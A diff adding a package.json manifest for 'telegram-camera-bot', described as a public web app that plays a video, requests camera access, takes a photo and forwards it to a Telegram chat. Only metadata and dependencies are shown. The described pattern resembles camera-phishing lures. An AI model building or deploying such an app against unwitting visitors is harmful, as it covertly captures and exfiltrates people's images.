@@ -1,0 +1,14 @@
+{
+  "name": "telegram-camera-bot",
+  "version": "1.0.0",
+  "description": "Public web app that plays a video, asks for camera permission, captures a photo, and sends it to a Telegram chat.",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "dotenv": "^16.4.5",
+    "express": "^4.19.2",
+    "form-data": "^4.5.1"
+  }
+}
